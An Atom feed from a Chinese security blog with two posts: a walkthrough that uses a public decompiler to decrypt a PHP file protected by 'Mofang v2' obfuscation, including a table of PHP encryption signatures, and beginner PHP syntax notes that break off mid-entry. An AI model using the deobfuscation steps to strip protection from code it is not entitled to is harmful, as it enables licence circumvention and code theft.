<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa55w0rd &#39;s Blog</title>
  
  <subtitle>记录</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.pa55w0rd.club/"/>
  <updated>2019-05-08T07:59:11.426Z</updated>
  <id>http://www.pa55w0rd.club/</id>
  
  <author>
    <name>Pa55w0rd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP 魔方加密二代 解密</title>
    <link href="http://www.pa55w0rd.club/php-mfenc-decompiler/"/>
    <id>http://www.pa55w0rd.club/php-mfenc-decompiler/</id>
    <published>2019-05-08T06:50:36.000Z</published>
    <updated>2019-05-08T07:59:11.426Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>洪哥给我一个加密的PHP代码，问我有没有办法搞出来，没有接触过PHP混淆加密，百度了一下加密特征，使用的是魔方二代加密方法。</p><p>从52破解上找了一个魔方二代加密反编译代码对加密的PHP代码进行解密，记录一下过程</p><a id="more"></a><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=770762" target="_blank" rel="noopener">[调试逆向] PHP解密：魔方加密2代 全自动反编译器</a></p><p>汇编这块看不懂，直接拉到最下面，大佬给出了反编译代码</p><p><a href="https://github.com/ganlvtech/php-mfenc-decompiler" target="_blank" rel="noopener">PHP mfenc Decompiler</a></p><h2 id="0x01-常用的加密类型及特征"><a href="#0x01-常用的加密类型及特征" class="headerlink" title="0x01 常用的加密类型及特征"></a>0x01 常用的加密类型及特征</h2><table><thead><tr><th>加密类型</th><th>加密特征</th></tr></thead><tbody><tr><td>Zend/PHP5.3/5.4<br>Zend/PHP5.5/5.6</td><td>文件头部 &lt;?php @Zend或Zend<br>PHP 5.3 2004072201 65540<br>PHP 5.4 2004072201 65541<br>PHP 5.5 2004072201 65542<br>PHP 5.6 2004072201 65543</td></tr><tr><td>微擎加密</td><td>主要使用goto语法打乱代码顺序  </td></tr><tr><td>魔方一代加密</td><td>function 开头包含很多function </td></tr><tr><td>魔方二代加密</td><td>if(isset($乱码){array_push$乱码… 开头 </td></tr><tr><td>ionCube</td><td>文件头部 &lt;?php //00xxx(16进制数字) 或 HR+c</td></tr><tr><td>php-screw</td><td>文件头部 PM9SCREW等一般是定制版本, 文件特征各不相同 </td></tr><tr><td>php-beast</td><td>文件头部 二进制数据 “\xe8\x16\xa4\x0c”一般是定制版本, 文件特征各不相同 </td></tr><tr><td>ZoeeyGuard</td><td>调用函数 zoeey_run等一般是定制版本, 文件特征各不相同 </td></tr></tbody></table><h2 id="0x02-解密"><a href="#0x02-解密" class="headerlink" title="0x02 解密"></a>0x02 解密</h2><img src="/php-mfenc-decompiler/1.png" title="描述"><p>对比一下加密特征，符合魔方二代加密</p><h3 id="下载PHP-mfenc反编译器代码"><a href="#下载PHP-mfenc反编译器代码" class="headerlink" title="下载PHP mfenc反编译器代码"></a>下载PHP mfenc反编译器代码</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># git clone https:<span class="comment">//github.com/ganlvtech/php-mfenc-decompiler.git</span></span></span><br></pre></td></tr></table></figure><h3 id="删除composer-lock"><a href="#删除composer-lock" class="headerlink" title="删除composer.lock"></a>删除composer.lock</h3><h3 id="使用composer安装依赖的库文件"><a href="#使用composer安装依赖的库文件" class="headerlink" title="使用composer安装依赖的库文件"></a>使用composer安装依赖的库文件</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># composer install</span></span><br></pre></td></tr></table></figure><blockquote><p>注意PHP版本 &gt; 7.0</p></blockquote><h3 id="通过rebuild对member-php进行解密"><a href="#通过rebuild对member-php进行解密" class="headerlink" title="通过rebuild对member.php进行解密"></a>通过rebuild对member.php进行解密</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># php bin/rebuild.php member.php</span></span><br></pre></td></tr></table></figure><p>会在当前目录下生成member.rebuilt.php文件</p><h3 id="解密结果"><a href="#解密结果" class="headerlink" title="解密结果"></a>解密结果</h3><img src="/php-mfenc-decompiler/2.png" title="描述"><h2 id="Centos7-安装PHP-7"><a href="#Centos7-安装PHP-7" class="headerlink" title="Centos7 安装PHP 7"></a>Centos7 安装PHP 7</h2><p>我的PHP版本是PHP 5.4，在使用composer安装依赖报错提示需要 PHP &gt; 7.0</p><p>通过yum安装报错，只能通过源码编译安装，速度比较慢</p><p>可以使用remi源</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/remi/enterprise/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/remi/enterprise/</a></p><h2 id="安装compoeser"><a href="#安装compoeser" class="headerlink" title="安装compoeser"></a>安装compoeser</h2><p><code>`</code><br>下载安装脚本 － composer-setup.php － 到当前目录。</p><h1 id="php-r-“copy-‘https-install-phpcomposer-com-installer-39-‘composer-setup-php’-”"><a href="#php-r-“copy-‘https-install-phpcomposer-com-installer-39-‘composer-setup-php’-”" class="headerlink" title="php -r “copy(‘https://install.phpcomposer.com/installer&#39;, ‘composer-setup.php’);”"></a>php -r “copy(‘<a href="https://install.phpcomposer.com/installer&#39;" target="_blank" rel="noopener">https://install.phpcomposer.com/installer&#39;</a>, ‘composer-setup.php’);”</h1><p>执行安装过程</p><h1 id="php-composer-setup-php"><a href="#php-composer-setup-php" class="headerlink" title="php composer-setup.php"></a>php composer-setup.php</h1><p>删除安装脚本</p><h1 id="php-r-“unlink-‘composer-setup-php’-”"><a href="#php-r-“unlink-‘composer-setup-php’-”" class="headerlink" title="php -r “unlink(‘composer-setup.php’);”"></a>php -r “unlink(‘composer-setup.php’);”</h1><p>全局安装</p><h1 id="mv-composer-phar-usr-local-bin-composer"><a href="#mv-composer-phar-usr-local-bin-composer" class="headerlink" title="mv composer.phar /usr/local/bin/composer"></a>mv composer.phar /usr/local/bin/composer</h1><p>切换为国内镜像</p><h1 id="composer-config-g-repo-packagist-composer-https-packagist-phpcomposer-com"><a href="#composer-config-g-repo-packagist-composer-https-packagist-phpcomposer-com" class="headerlink" title="composer config -g repo.packagist composer https://packagist.phpcomposer.com"></a>composer config -g repo.packagist composer <a href="https://packagist.phpcomposer.com" target="_blank" rel="noopener">https://packagist.phpcomposer.com</a></h1><p>更新 composer</p><h1 id="composer-selfupdate"><a href="#composer-selfupdate" class="headerlink" title="composer selfupdate"></a>composer selfupdate</h1><p>安装依赖</p><h1 id="composer-install"><a href="#composer-install" class="headerlink" title="composer install"></a>composer install</h1><p><code></code><br>更多请参考<a href="https://www.runoob.com/w3cnote/composer-install-and-usage.html" target="_blank" rel="noopener">Composer 安装与使用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;洪哥给我一个加密的PHP代码，问我有没有办法搞出来，没有接触过PHP混淆加密，百度了一下加密特征，使用的是魔方二代加密方法。&lt;/p&gt;
&lt;p&gt;从52破解上找了一个魔方二代加密反编译代码对加密的PHP代码进行解密，记录一下过程&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="代码审计" scheme="http://www.pa55w0rd.club/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHP编程基础学习记录</title>
    <link href="http://www.pa55w0rd.club/php-study/"/>
    <id>http://www.pa55w0rd.club/php-study/</id>
    <published>2019-05-05T08:14:49.000Z</published>
    <updated>2019-05-05T08:38:08.767Z</updated>
    
    <content type="html"><![CDATA[<p>印象笔记中躺着一篇当时学PHP的一篇笔记，贴出来，从慕课网上学的</p><p><a href="https://www.php.net/manual/zh/" target="_blank" rel="noopener">PHP官方手册</a></p><p>看代码还是直接查手册吧</p><a id="more"></a><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>运行在服务端、跨平台、脚本语言、免费</p><p>代码标识<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello world!"</span>; <span class="comment">//可以把多个字符串连接起来，连接符用点 （.） 表示，结束符（;）表示，注释用（//）表示</span></span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">// <span class="meta">?&gt;</span>可以忽略</span></span><br></pre></td></tr></table></figure></p><h4 id="PHP变量的数据类型"><a href="#PHP变量的数据类型" class="headerlink" title="PHP变量的数据类型"></a>PHP变量的数据类型</h4><p><strong>变量</strong>在程序执行期间可以变化的量，是用于存储数据的<br><strong>定义变量</strong>就是向服务器的内存申请空间，用来存储数据<br>变量名和变量值<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var_name = <span class="string">"test"</span>   <span class="comment">//$ 变量标识符</span></span><br></pre></td></tr></table></figure></p><p><strong>变量名称命名规则</strong><br>变量名必须以字母或下划线开头，由字母、数字和下划线组成，不允许包含空格，当变量名由多个单词组成，建议使用下划线法（$my_name）或驼峰命名法（$myName），注意变量名区分大小写<br><code>var_dump</code> 函数可以用来输出变量的数据类型<br><code>memory_get_usage</code>函数获取当前PHP消耗的内存<br><strong>数据类型</strong><br>8种原始类型，其中包括四种<code>标量类型</code>、两种<code>复合类型</code>和两种<code>特殊类型</code><br>PHP是一门松散类型的语言，不必向PHP声明变量的数据类型，PHP会自动把变量转换为自动的数据类型</p><table><thead><tr><th>数据类型</th><th>种类</th><th>特点</th></tr></thead><tbody><tr><td>标量类型</td><td>整型</td><td>八进制/十进制/十六进制 范围：有符号-21亿到21亿，无符号0-42亿，超过溢出</td></tr><tr><td>标量类型</td><td>浮点型</td></tr><tr><td>标量类型</td><td>布尔型</td></tr><tr><td>标量类型</td><td>字符串型</td></tr><tr><td>复合类型</td><td>数组（array）</td></tr><tr><td>复合类型</td><td>对象（object）</td></tr><tr><td>特殊类型</td><td>资源（resource）</td></tr><tr><td>特殊类型</td><td>空（null） </td></tr></tbody></table><p><code>标量类型只能存储单一数据</code></p><p><strong>标量类型-布尔类型</strong></p><p>尔类型（boolean）：只有两个值，一个是TRUE，另一个FALSE，可以理解为是或否。它不区分大小写，主要用在条件结构中，判断是否满足条件</p><p><strong>标量类型-整型</strong></p><p>整型（integer）：类似于常见的整数。它可以用十进制、八进制（0，如0123）、十六进制（0x，如0x123）指定</p><p><strong>标量类型-浮点型</strong></p><p>浮点型（浮点数、双精度数或实数），也就是通常说的小数，可以用小数点或者科学计数法表示。科学计数法可以使用小写的e，也可以使用大写的E。</p><p>如1.234，1.2e3，1.2E-10</p><p><strong>标量类型-字符串</strong></p><p>字符串是由一系列字符组成，在PHP中，字符和字节一样，也就是说，一共有256种不同字符的可能性。字符串型可以用三种方法定义：单引号形式、双引号形式和Heredoc结构形式。</p><p><code>当双引号中包含变量时，变量会与双引号中的内容连接在一起；当单引号中包含变量时，变量会被当做字符串输出。</code></p><p><code>当字符串很长，可以使用Heredoc结构形式解决首先使用定界符表示字符串（&lt;&lt;&lt;），接着在“&lt;&lt;&lt;“之后提供一个标识符GOD，然后是字符串，最后以提供的这个标识符结束字符串</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$string1 = <span class="string">&lt;&lt;&lt;GOD</span></span><br><span class="line"><span class="string">我有一只小毛驴，我从来也不骑。</span></span><br><span class="line"><span class="string">有一天我心血来潮，骑着去赶集。</span></span><br><span class="line"><span class="string">我手里拿着小皮鞭，我心里正得意。</span></span><br><span class="line"><span class="string">不知怎么哗啦啦啦啦，我摔了一身泥.</span></span><br><span class="line"><span class="string">GOD;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $string1;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>特殊类型-资源</strong></p><p>资源（resource）：资源是由专门的函数来建立和使用的，例如打开文件、数据连接、图形画布。我们可以对资源进行操作（创建、使用和释放）。任何资源，在不需要的时候应该被及时释放。如果我们忘记了释放资源，系统自动启用垃圾回收机制，在页面执行完毕后回收资源，以避免内存被消耗殆尽。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=fopen(<span class="string">"f.txt"</span>,<span class="string">"r"</span>);   <span class="comment">//打开文件</span></span><br><span class="line">$con=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);  <span class="comment">//连接数据库</span></span><br><span class="line">$img=imagecreate(<span class="number">100</span>,<span class="number">100</span>);<span class="comment">//图形画布</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>特殊类型—空类型</strong></p><p>NULL（NULL）：NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值，或者被unset()，这三种情况下变量被认为为NULL。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> error_reporting(<span class="number">0</span>); <span class="comment">//禁止显示PHP警告提示</span></span><br><span class="line"> $var;</span><br><span class="line"> var_dump($var);</span><br><span class="line"> $var1 = <span class="keyword">null</span>;</span><br><span class="line"> var_dump($var1);</span><br><span class="line"> $var2 = <span class="keyword">NULL</span>;</span><br><span class="line"> var_dump( $var2);</span><br><span class="line"> $var3 = <span class="string">"节日快乐！"</span>;</span><br><span class="line"> <span class="keyword">unset</span>($var3);</span><br><span class="line"> var_dump($var3);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><p>什么是常量？常量可以理解为值不变的量（如圆周率）；或者是常量值被定义后，在脚本的其他任何地方都不可以被改变。PHP中的常量分为自定义常量和系统常量<br><strong>自定义常量</strong><br>定义常量是根据我们开发的需要，而定义的常量，它通过使用PHP中的函数define()定义。<br>使用 const定义常量<br>const WEB_TITLE=”XXXX”</p><p>常量主要功效是可以避免重复定义，篡改变量值。</p><p>bool define(string $constant_name, mixed $value[, $case_sensitive = true])</p><p>它有3个参数（也就是原料）：第一个参数“constant_name”为必选参数，常量名称,即标志符，常量的命名规则与变量的一致，但是要注意哦，它可不带美元符号哦。第二个参数“value”为必选参数，它是常量的值。第三个参数“case_sensitive”为可选参数，指定是否大小写敏感，设定为true表示不敏感，一般不指定第三个参数的情况下，默认第三个参数的值为false。（注： string表示参数类型为字符串类型，mixed表示参数类型可以接受为多种不同的类型，case_sensitive = true表示默认为布尔类型TRUE）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="string">"PII"</span>;</span><br><span class="line">define(<span class="string">"PI"</span>,<span class="number">3.14</span>);</span><br><span class="line">define($p,<span class="number">3.14</span>);</span><br><span class="line"><span class="keyword">echo</span> PI;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PII;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>系统常量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>; <span class="comment">//php程序文件名，获取当前文件在服务器的物理位置</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__LINE__</span>;<span class="comment">//当前的行数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_VERSION;<span class="comment">//当前解析器版本号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_OS;<span class="comment">//操作系统名称</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F:\study\php\a.php</span><br><span class="line">9</span><br><span class="line">7.0.12</span><br><span class="line">WINNT</span><br></pre></td></tr></table></figure></p><p><strong>常量如何取值</strong></p><p>获取常量值的有两种方法取值。第一种是使用常量名直接获取值；</p><p>第二种是使用<code>constant()函数</code>。它和直接使用常量名输出的效果是一样的，但函数可以动态的输出不同的常量，在使用上要灵活、方便，其语法格式如下：<br><code>mixed constant(string constant_name)</code></p><p>第一个参数constant_name为要获取常量的名称，也可为存储常量名的变量。如果成功则返回常量的值，失败则提示错误信息常量没有被定义。（注：mixed表示函数返回值类型为多种不同的类型，string表示参数类型为字符串类型）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$p=<span class="string">""</span>;</span><br><span class="line"><span class="comment">//定义圆周率的两种取值</span></span><br><span class="line">define(<span class="string">"PI1"</span>,<span class="number">3.14</span>);</span><br><span class="line">define(<span class="string">"PI2"</span>,<span class="number">3.142</span>);</span><br><span class="line"><span class="comment">//定义值的精度</span></span><br><span class="line">$height = <span class="string">"中"</span>;</span><br><span class="line"><span class="comment">//根据精度返回常量名，将常量变成了一个可变的常量</span></span><br><span class="line"><span class="keyword">if</span>($height == <span class="string">"中"</span>)&#123;</span><br><span class="line">    $p = <span class="string">"PI1"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($height == <span class="string">"低"</span>)&#123;</span><br><span class="line">$p = <span class="string">"PI2"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$r=<span class="number">1</span>;</span><br><span class="line">$area= constant($p)*$r*$r;</span><br><span class="line"><span class="keyword">echo</span> $area;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>xmsec@evalsafe<br><a href="http://47.95.199.122:8000" target="_blank" rel="noopener">http://47.95.199.122:8000</a></p><p><strong>如何判断常量是否被定义</strong></p><p>如果常量被重复定义以后，PHP解析器会发出“Constant XXX already defined”的警告，提醒我们该常量已经被定义过</p><p>defined()函数可以帮助我们判断一个常量是否已经定义，其语法格式为：<br><code>bool defined(string constants_name)</code><br>它只有参数constant_name，指的是要获取常量的名称，若存在则返回布尔类型true，否则返回布尔类型false; （注：bool表示函数返回值类型为布尔类型）</p><p><strong>获取所有已定义的常量</strong><br><code>get_defined_constants()</code><br>通过print_r打印数组<br><strong>魔术常量</strong><br>由__双下划线开始</p><h4 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h4><p>所有预定义变量都是全局变量<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$GLOBALS</span></span></span><br><span class="line"><span class="symbol">$</span>_SERVERS</span><br><span class="line"><span class="symbol">$</span>_ENV</span><br><span class="line"><span class="symbol">$</span>_COOKIE</span><br><span class="line"><span class="symbol">$</span>_SESSION</span><br><span class="line"><span class="symbol">$</span>_FILES</span><br><span class="line"><span class="symbol">$</span>_GET</span><br><span class="line"><span class="symbol">$</span>_POST</span><br><span class="line"><span class="symbol">$</span>_REQUEST (<span class="symbol">$</span>_GET/<span class="symbol">$</span>_POST/<span class="symbol">$</span>_COOKIE)</span><br></pre></td></tr></table></figure></p><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>算符是告诉PHP做相关运算的标识符号</p><p>PHP运算符一般分为算术运算符、赋值运算符、比较运算符、三元运算符、逻辑运算符、字符串连接运算符、错误控制运算符。<br><strong>算术运算符</strong><br><img src="/php-study/3.png" title="描述"></p><p><code>取模算术符</code></p><p>假设我们要在一个考场安排了一场考试，对考生从1开始，都进行了编号，那么怎么让服务器帮助我们计算考生在的位置呢，进而打印考场的考生对照表呢?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">     $maxLine = <span class="number">4</span>; <span class="comment">//每排人数</span></span><br><span class="line"> $no = <span class="number">16</span>;<span class="comment">//学生编号</span></span><br><span class="line"></span><br><span class="line">$line = ceil($no/$maxLine);</span><br><span class="line">$row = $no%$maxLine?$no%$maxLine:$maxLine;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"编号&lt;b&gt;"</span>.$no.<span class="string">"&lt;/b&gt;的座位在第&lt;b&gt;"</span>.$line.<span class="string">"&lt;/b&gt;排第&lt;b&gt;"</span>.$row.<span class="string">"&lt;/b&gt;个位置"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>赋值运算符</strong></p><p>(1)“=”：把右边表达式的值赋给左边的运算数。它将右边表达式值复制一份，交给左边的运算数。换而言之，首先给左边的运算数申请了一块内存，然后把复制的值放到这个内存中。<br>(2)“&amp;”：引用赋值，意味着两个变量都指向同一个数据。它将使两个变量共享一块内存，如果这个内存存储的数据变了，那么两个变量的值都会发生变化。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">"我在慕课网学习PHP！"</span>;</span><br><span class="line">$b = $a;</span><br><span class="line">$c = &amp;$a;</span><br><span class="line">$a = <span class="string">"我天天在慕课网学习PHP！"</span>;</span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $c.<span class="string">"&lt;br /&gt;"</span>;</span><br></pre></td></tr></table></figure></p><p><strong>比较运算符</strong><br><img src="/php-study/2.png" title="描述"></p><p><strong>三元运算符</strong></p><p>(“?:”)三元运算符也是一个比较运算符，对于表达式(expr1)?(expr2):(expr3)，如果expr1的值为true，则此表达式的值为expr2，否则为expr3。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a = <span class="number">78</span>;<span class="comment">//成绩</span></span><br><span class="line">$b = $a &gt;=<span class="number">60</span>?<span class="string">'及格'</span>:<span class="string">'不及格'</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>逻辑运算符</strong><br><img src="/php-study/1.png" title="描述"></p><p><strong>连接运算符</strong></p><p>字符串连接运算符是为了将两个字符串进行连接，PHP中提供的字符串连接运算符有：<br>（1）连接运算符(“.”)：它返回将右参数附加到左参数后面所得的字符串。<br>（2）连接赋值运算符(“.=”)：它将右边参数附加到左边的参数后。</p><p><strong>错误控制运算符</strong></p><p>PHP中提供了一个错误控制运算符“@”，对于一些可能会在运行过程中出错的表达式时，我们不希望出错的时候给客户显示错误信息，这样对用户不友好。于是，可以将@放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被忽略掉；</p><p>如果激活了track_error（这个玩意在php.ini中设置）特性，表达式所产生的任何错误信息都被存放在变量<code>$php_errormsg</code>中，此变量在每次出错时都会被覆盖，所以如果想用它的话必须尽早检查。</p><p>需要注意的是：错误控制前缀“@”不会屏蔽解析错误的信息，不能把它放在函数或类的定义之前，也不能用于条件结构例如if和foreach等。</p><h4 id="语言结构"><a href="#语言结构" class="headerlink" title="语言结构"></a>语言结构</h4><p><strong>顺序结构</strong></p><p>顺序结构就像一条直线，按着顺序一直往下执行。我们编写的代码默认都是按照顺序结构执行的。</p><p><strong>条件结构</strong></p><p>PHP中的“if…else…”语法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(条件)&#123;</span><br><span class="line">     <span class="comment">//分配服务器干的任务A</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="comment">//分配服务器干的任务B</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>PHP中的“if…else if…”语法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(条件一)&#123;</span><br><span class="line">     <span class="comment">//分配服务器干的任务A</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件二)&#123;</span><br><span class="line">     <span class="comment">//分配服务器干的任务B</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>PHP条件结构之if…else if…else…<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(条件一)&#123;</span><br><span class="line">     <span class="comment">//分配服务器干的任务A</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件二)&#123;</span><br><span class="line">     <span class="comment">//分配服务器干的任务B</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="comment">//分配服务器干的任务C</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>PHP条件结构之switch…case…</p><p>使用 switch 语句可以避免冗长的 “if..else if..else”代码块</p><p>break的作用是阻止代码进入下一个case 中继续执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span> (条件)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> 条件值一:</span><br><span class="line">  <span class="comment">//任务一</span></span><br><span class="line">  <span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">case</span> 条件值二:</span><br><span class="line">  <span 